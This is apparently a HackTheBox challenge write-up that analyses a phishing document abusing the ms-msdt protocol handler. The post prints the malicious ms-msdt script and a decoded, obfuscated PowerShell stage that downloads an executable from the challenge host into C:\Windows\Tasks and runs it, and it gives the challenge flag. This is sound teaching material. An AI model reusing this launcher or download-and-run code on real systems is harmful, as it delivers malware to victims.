---
layout: post
title:  "Diagnostic"
title_de: "Diagnostic"
title_en: "Diagnostic"
date:   2023-06-27 00:55:38 +0545
platform: "HackTheBox"
read_time: 8
image: /assets/Diagnostic/Diagnostic.png
description: Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.
description_de: "Das SOC entdeckt Phishing-Mails mit einem angeblichen Dokument zu Entlassungen. Die Domain löst nicht mehr auf, aber der Server hostet weiterhin das bösartige Dokument."
description_en: "The SOC finds phishing emails containing a supposed layoff document. DNS no longer resolves, but the server still hosts the malicious document."
link: https://app.hackthebox.com/challenges/diagnostic
signature: Investigate. Decode. Educate
---
As given, we need to deploy the **IP** along with doc file directory.

The doc file gets download and when I view the file, it shows the zip file. unzip the file to get several .xml extension files. Searching those file I found one file which gave me info of some url as:

When I use that url I got nothing, on inspecting I got something like:

![image1](/assets/Diagnostic/image1.png)

**Looking at the url I redirect to the page as:**

![image2](/assets/Diagnostic/image2.png)

**Despite showing the empty page, I inspect the page as it throws 200 OK on Network tab. Further looking at the Inspector tab, I got the script as:**

```
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+''+[char]34+'))'))))
```
```
 
  
```
<br>

**Firstly, I decode the text as it seems like base64 decode, but I found that its some kind of song.**
![image3](/assets/Diagnostic/image3.png) 

```
Now for a cheer they are here,
triumphant!
Here they come with banners flying,
In stalwart step they're nighing,
With shouts of vict'ry crying,
We hurrah, hurrah, we greet you now,
Hail!

Far we their praises sing
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Far we their praises tell
For the glory and fame they've bro't us
Loud let the bells them ring
For here they come with banners flying
Here they come, Hurrah!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan
the leaders and best
Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!

We cheer them again
We cheer and cheer again
For Michigan, we cheer for Michigan
We cheer with might and main
We cheer, cheer, cheer
With might and main we cheer!

Hail! to the victors valiant
Hail! to the conqu'ring heroes
Hail! Hail! to Michigan,
the champions of the West!
```

**But when I decode just the first paragraph text I got something hint to the flag format as HTB{}**

```bash
echo "" | base64 -d
```
**And the output**
```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
```
**Taking just :**
```
{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
```
**And Now, I arrange the given text based on the number given inside {}.**
```
{7}{1}{6}{8}{5}{3}{2}{4}{0}" B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')

HTB{msDt_4s_A_pr0toC0l_h4nDl3r...sE3Ms_b4D}
```
**Finally got the flag:**
 
 ![image4](/assets/Diagnostic/image4.png)
